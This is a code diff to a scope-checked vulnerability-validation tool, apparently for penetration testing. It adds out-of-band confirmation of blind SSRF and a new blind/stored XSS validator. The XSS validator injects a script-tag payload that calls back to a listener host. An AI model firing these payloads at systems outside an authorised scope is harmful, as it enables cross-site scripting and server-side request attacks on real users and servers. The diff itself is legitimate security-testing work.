@@ -286,23 +286,74 @@ class SsrfValidator(Validator):
     def run(self, f: Finding, scope: Scope) -> Validation:
         if not scope.is_in_scope(f.target):
             return Validation("skipped", self.name, detail="target out of scope")
-        # Needs a canary URL we control whose body carries a unique token. In a
-        # real engagement this is an out-of-band (OOB) listener; here it comes
-        # from the finding metadata. Reflected (non-blind) SSRF only.
-        canary = f.metadata.get("oob_url")
         param = f.metadata.get("param", "url")
-        if not canary:
+
+        # Preferred: BLIND confirmation via an OOB listener reachable by the target.
+        if scope.oob_url:
+            from .oob import OobClient
+            client = OobClient(scope.oob_url)
+            token = client.new_token()
+            test = _with_param(f.target, param, client.callback_url(token))
+            try:
+                _http(test)
+            except Exception:  # noqa: BLE001
+                pass
+            hits = client.wait_for(token, timeout=6)
+            if hits:
+                h = hits[0]
+                return Validation("confirmed", self.name,
+                                  evidence=f"OOB callback received from {h.get('src_ip')} "
+                                           f"(blind SSRF via '{param}', token {token[:8]})",
+                                  detail="Target made an out-of-band request to our listener.")
+            # fall through to reflected check below
+
+        # Fallback: reflected (non-blind) SSRF via a canary whose body echoes back.
+        canary = f.metadata.get("oob_url")
+        if canary:
+            _, _, body = _http(_with_param(f.target, param, canary))
+            if self._TOKEN in body or "canary" in body.lower():
+                return Validation("confirmed", self.name,
+                                  evidence=f"server fetched attacker-specified URL via '{param}'; "
+                                           f"canary body reflected",
+                                  detail="Server-side request to an attacker-controlled URL confirmed.")
+        if scope.oob_url:
+            return Validation("not_confirmed", self.name,
+                              detail="no OOB callback within timeout (not reachable, or not vulnerable)")
+        return Validation("unverified", self.name,
+                          detail="blind SSRF: set scope.oob_url (an OOB listener) to confirm")
+
+
+class BlindXssValidator(Validator):
+    name = "blind-xss"
+
+    def matches(self, f: Finding) -> bool:
+        t = f.title.lower()
+        return "blind xss" in t or "stored xss" in t or "blind cross-site" in t
+
+    def run(self, f: Finding, scope: Scope) -> Validation:
+        if not scope.is_in_scope(f.target):
+            return Validation("skipped", self.name, detail="target out of scope")
+        if not scope.oob_url:
             return Validation("unverified", self.name,
-                              detail="blind SSRF: supply metadata.oob_url (an OOB listener) to confirm")
-        test = _with_param(f.target, param, canary)
-        _, _, body = _http(test)
-        if self._TOKEN in body or "canary" in body.lower():
+                              detail="blind/stored XSS: set scope.oob_url to receive the callback")
+        from .oob import OobClient
+        client = OobClient(scope.oob_url)
+        token = client.new_token()
+        cb = client.callback_url(token)
+        param = f.metadata.get("param", "q")
+        # Inject payloads that call back when the script executes (in a browser).
+        payload = f'"><script src={cb}/x.js></script><img src={cb}/i.png>'
+        try:
+            _http(_with_param(f.target, param, payload))
+        except Exception:  # noqa: BLE001
+            pass
+        hits = client.wait_for(token, timeout=8)
+        if hits:
             return Validation("confirmed", self.name,
-                              evidence=f"server fetched attacker-specified URL via '{param}'; "
-                                       f"canary body reflected",
-                              detail="Server-side request to an attacker-controlled URL confirmed.")
+                              evidence=f"OOB callback received (payload executed), token {token[:8]}",
+                              detail="Injected script reached our listener when rendered.")
         return Validation("not_confirmed", self.name,
-                          detail="no canary reflection (may be blind SSRF — use an OOB listener)")
+                          detail="no callback yet — stored XSS may fire later when a victim views it")
 
 
 class JwtValidator(Validator):
@@ -361,6 +412,7 @@ _REGISTRY: list[Validator] = [
     GitExposedValidator(), DirectoryListingValidator(), SecurityHeaderValidator(),
     OpenRedirectValidator(), ReflectedXssValidator(), LfiValidator(),
     SqlInjectionValidator(), CorsValidator(), SsrfValidator(), JwtValidator(),
+    BlindXssValidator(),
 ]
 
 
